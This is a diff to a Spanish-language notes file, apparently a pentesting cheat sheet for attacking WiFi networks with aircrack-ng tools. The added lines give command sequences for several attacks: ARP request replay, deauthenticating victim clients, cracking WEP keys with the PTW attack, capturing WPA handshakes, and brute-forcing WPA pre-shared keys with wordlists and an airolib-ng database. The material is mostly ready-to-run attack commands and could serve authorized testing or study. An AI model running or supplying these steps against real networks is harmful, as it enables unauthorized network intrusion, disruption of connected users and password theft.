@@ -67,7 +67,7 @@ Recomendable hacer un fake auth para tener la MAC asociada y que sea más fiable
 aireplay-ng -1 0 -e ESSID-AP -a MAC-AP -h NUESTRA-MAC mon0
 aireplay-ng -2 -b MAC-AP -d FF:FF:FF:FF:FF:FF -f 1 (filtrar que sean paquetes con FromDS) -m 68 -n 86 (min y max ARP packet size) mon0
   Cuando encuentra un paquete y le damos a "y" para reenviar, los #Data deberían subir mucho. Si no suben, Ctrl+C y probar con otro. Se puede hacer 
-aircrack-ng -0 -z -n 64 (num bits de WEP key) CAPTURE-FILENAME
+aircrack-ng -0 -z (usa PTW Attack) -n 64 (num bits de WEP key) CAPTURE-FILENAME
 
 aireplay-ng -2 -r CAPTURA-CON-PAQUETE-VALIDO mon0
 
@@ -108,5 +108,35 @@ Fake Authentication con SKA
 aireplay-ng -0 1 (deauth) -a MAC-AP -c MAC-VICTIM mon0 (Para que muestre si es SKA)
   Nos creará un .xor
 aireplay-ng -1 60 -e ESSID-AP -y .xor-FILE -a AP-MAC -h NUESTRA-MAC mon0
+
+ARP Request Replay Attack
+aireplay-ng -3 -b MAC-AP -h NUESTRA-MAC mon0
+Hacemos un deauth para obtener un paquete ARP
+aireplay-ng -0 1 -a MAC-AP -c MAC-VICTIM mon0
+
+aircrack-ng -0 -z (usa PTW attack) -n 64 NOMBRE-CAPTURA
+
+##############################
+
+------------------------------
+WPA PRE SHARED KEY
+------------------------------
+
+airmon-ng start wlan0 [channel]
+airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA mon0
+Capturamos el handshake =>
+aireplay-ng -0 1 -a MAC-AP -c MAC-VICTIM mon0
+(El paquete 1 y el 3 del 4way handshake tienen que tener el mismo nonce (mirar en wireshark))
+aircrack-ng -0 -w DICC[/pentest/passwords/john/password.lst] NOMBRE-CAPTURA
+
+airolib-ng NOMBRE-DB-A-CREAR --import essid NOMBRE-ARCHIVO-CON-ESSID-TARGET
+airolib-ng NOMBRE-DB-ANTERIOR --stats
+airolib-ng NOMBRE-DB-ANTERIOR --import passwd DICC (Ignora las passwords que no sean válidas para wpa)
+airolib-ng NOMBRE-DB-ANTERIOR --batch
+airolib-ng NOMBRE-DB-ANTERIOR --stats (Vemos que ya hay contraseñas)
+aircrack-ng -r NOMBRE-DB-ANTERIOR NOMBRE-CAPTURA
+
+
+
 
 
